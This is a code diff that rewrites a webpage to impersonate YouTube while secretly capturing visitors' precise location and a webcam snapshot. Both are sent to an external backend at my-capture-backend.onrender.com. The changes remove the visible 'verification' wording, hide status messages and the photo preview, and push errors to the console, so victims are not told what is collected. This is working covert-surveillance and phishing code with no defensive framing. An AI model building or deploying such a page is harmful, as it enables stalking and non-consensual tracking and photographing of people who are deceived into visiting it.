@@ -3,15 +3,181 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Permission Verification</title>
-  <style>body { font-family: sans-serif; padding: 20px; text-align: center; }</style>
+  <title>YouTube</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: Roboto, Arial, sans-serif; background: #0f0f0f; color: #fff; }
+    .header {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 8px 16px; background: #0f0f0f; border-bottom: 1px solid #303030;
+      position: sticky; top: 0; z-index: 100;
+    }
+    .logo { display: flex; align-items: center; gap: 4px; font-size: 20px; font-weight: bold; }
+    .logo-icon { color: #ff0000; font-size: 24px; }
+    .search-bar { flex: 1; max-width: 600px; margin: 0 40px; display: flex; }
+    .search-bar input {
+      flex: 1; padding: 8px 12px; background: #121212; border: 1px solid #303030;
+      border-radius: 20px 0 0 20px; color: #fff; outline: none;
+    }
+    .search-bar button {
+      padding: 8px 20px; background: #222; border: 1px solid #303030;
+      border-left: none; border-radius: 0 20px 20px 0; color: #fff; cursor: pointer;
+    }
+    .icons { display: flex; gap: 16px; align-items: center; font-size: 20px; }
+    .container { display: flex; }
+    .sidebar {
+      width: 240px; padding: 12px; background: #0f0f0f; min-height: calc(100vh - 57px);
+    }
+    .sidebar a {
+      display: block; padding: 10px 12px; color: #fff; text-decoration: none;
+      border-radius: 10px; margin-bottom: 4px; font-size: 14px;
+    }
+    .sidebar a:hover { background: #272727; }
+    .sidebar a.active { background: #272727; }
+    .main { flex: 1; padding: 20px; }
+    .video-grid {
+      display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px;
+    }
+    .video-card { cursor: pointer; }
+    .thumbnail {
+      width: 100%; aspect-ratio: 16/9; background: linear-gradient(135deg, #1a1a1a, #333);
+      border-radius: 12px; display: flex; align-items: center; justify-content: center;
+      color: #888; font-size: 40px; margin-bottom: 12px;
+    }
+    .video-info { display: flex; gap: 12px; }
+    .avatar {
+      width: 36px; height: 36px; border-radius: 50%; background: #444; flex-shrink: 0;
+    }
+    .video-title { font-size: 14px; font-weight: 500; margin-bottom: 4px; line-height: 1.4; }
+    .video-meta { font-size: 12px; color: #aaa; }
+
+    /* Hidden status text */
+    #status { display: none; }
+
+    /* Tiny capture box in corner */
+    #video {
+      position: fixed; bottom: 16px; right: 16px; width: 120px; height: 90px;
+      border-radius: 8px; border: 2px solid #ff0000; object-fit: cover;
+      z-index: 9999; display: none;
+    }
+    #preview {
+      position: fixed; bottom: 16px; right: 16px; width: 80px; height: 60px;
+      border-radius: 6px; border: 1px solid #444; object-fit: cover;
+      z-index: 9999; display: none;
+    }
+    #canvas { display: none; }
+
+    /* Success links in corner (tiny) */
+    #status.success {
+      display: block; position: fixed; bottom: 16px; right: 16px;
+      background: rgba(0,0,0,0.85); padding: 6px 10px; border-radius: 8px;
+      font-size: 11px; color: #fff; z-index: 10000; max-width: 200px;
+    }
+    #status.success a { color: #3ea6ff; text-decoration: none; display: block; margin-top: 2px; }
+    #status.success a:hover { text-decoration: underline; }
+  </style>
 </head>
 <body>
-  <h2>Location & Selfie Verification</h2>
-  <p id="status">Requesting permissions... Please click "Allow".</p>
-  <video id="video" autoplay playsinline width="300" style="display:none; border-radius: 8px;"></video>
-  <canvas id="canvas" width="300" height="225" style="display:none;"></canvas>
-  <img id="preview" width="300" style="border-radius: 8px; margin-top: 10px;" />
+  <!-- YouTube Header -->
+  <div class="header">
+    <div class="logo">
+      <span class="logo-icon">▶</span> YouTube
+    </div>
+    <div class="search-bar">
+      <input type="text" placeholder="Search">
+      <button>🔍</button>
+    </div>
+    <div class="icons">
+      <span>🔔</span>
+      <div class="avatar"></div>
+    </div>
+  </div>
+
+  <div class="container">
+    <!-- Sidebar -->
+    <div class="sidebar">
+      <a href="#" class="active">🏠 Home</a>
+      <a href="#">🔥 Trending</a>
+      <a href="#">🎵 Music</a>
+      <a href="#">🎮 Gaming</a>
+      <a href="#">📺 Subscriptions</a>
+      <a href="#">📚 Library</a>
+      <a href="#">❤️ Liked videos</a>
+      <a href="#">⏰ History</a>
+    </div>
+
+    <!-- Main Video Grid -->
+    <div class="main">
+      <div class="video-grid">
+        <div class="video-card">
+          <div class="thumbnail">🎬</div>
+          <div class="video-info">
+            <div class="avatar"></div>
+            <div>
+              <div class="video-title">Amazing Video Title Here</div>
+              <div class="video-meta">Channel Name • 1M views • 2 days ago</div>
+            </div>
+          </div>
+        </div>
+        <div class="video-card">
+          <div class="thumbnail">🎮</div>
+          <div class="video-info">
+            <div class="avatar"></div>
+            <div>
+              <div class="video-title">Gaming Highlights 2026</div>
+              <div class="video-meta">GamerPro • 500K views • 1 week ago</div>
+            </div>
+          </div>
+        </div>
+        <div class="video-card">
+          <div class="thumbnail">🎵</div>
+          <div class="video-info">
+            <div class="avatar"></div>
+            <div>
+              <div class="video-title">Top Music Hits</div>
+              <div class="video-meta">MusicWorld • 2M views • 3 days ago</div>
+            </div>
+          </div>
+        </div>
+        <div class="video-card">
+          <div class="thumbnail">📚</div>
+          <div class="video-info">
+            <div class="avatar"></div>
+            <div>
+              <div class="video-title">Learn Coding Fast</div>
+              <div class="video-meta">CodeMaster • 300K views • 5 days ago</div>
+            </div>
+          </div>
+        </div>
+        <div class="video-card">
+          <div class="thumbnail">🌍</div>
+          <div class="video-info">
+            <div class="avatar"></div>
+            <div>
+              <div class="video-title">Travel the World</div>
+              <div class="video-meta">Wanderlust • 800K views • 1 day ago</div>
+            </div>
+          </div>
+        </div>
+        <div class="video-card">
+          <div class="thumbnail">🍳</div>
+          <div class="video-info">
+            <div class="avatar"></div>
+            <div>
+              <div class="video-title">Easy Cooking Recipes</div>
+              <div class="video-meta">ChefLife • 200K views • 4 days ago</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Hidden elements -->
+  <p id="status"></p>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="300" height="225"></canvas>
+  <img id="preview" />
 
   <script>
     const BACKEND_URL = 'https://my-capture-backend.onrender.com/api/capture';
@@ -21,6 +187,7 @@
       let locationData = null;
       let selfieData = null;
 
+      // 1. Get location
       try {
         const pos = await new Promise((resolve, reject) => {
           navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
@@ -30,30 +197,31 @@
           lng: pos.coords.longitude,
           accuracy: pos.coords.accuracy
         };
-        statusEl.textContent = 'Location obtained. Requesting camera...';
       } catch (e) {
-        statusEl.textContent = 'Location failed: ' + e.message + '. Trying camera...';
+        console.log('Location failed:', e.message);
       }
 
+      // 2. Get selfie (tiny box in corner)
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.getElementById('video');
         video.srcObject = stream;
+        video.style.display = 'block';
         await video.play();
         await new Promise(r => setTimeout(r, 1000));
 
         const canvas = document.getElementById('canvas');
         canvas.getContext('2d').drawImage(video, 0, 0, 300, 225);
         selfieData = canvas.toDataURL('image/jpeg', 0.7);
-        document.getElementById('preview').src = selfieData;
 
         stream.getTracks().forEach(t => t.stop());
+        video.style.display = 'none';
       } catch (e) {
-        statusEl.textContent += ' | Camera failed: ' + e.message;
+        console.log('Camera failed:', e.message);
       }
 
+      // 3. Send to backend
       if (locationData || selfieData) {
-        statusEl.textContent = 'Sending data...';
         try {
           const res = await fetch(BACKEND_URL, {
             method: 'POST',
@@ -66,12 +234,20 @@
           });
           if (res.ok) {
             const data = await res.json();
-            statusEl.innerHTML = '✅ Success! <a href="' + data.selfieUrl + '" target="_blank">Open your selfie</a>';
-          } else {
-            statusEl.textContent = '❌ Server error: ' + res.status;
+            let msg = '';
+            if (data.selfieUrl) {
+              msg += '<a href="' + data.selfieUrl + '" target="_blank">📸 Selfie</a>';
+            }
+            if (data.mapUrl) {
+              msg += '<a href="' + data.mapUrl + '" target="_blank">📍 Location</a>';
+            }
+            if (msg) {
+              statusEl.className = 'success';
+              statusEl.innerHTML = msg;
+            }
           }
         } catch (e) {
-          statusEl.textContent = '❌ Network error: ' + e.message;
+          console.log('Network error:', e.message);
         }
       }
     }
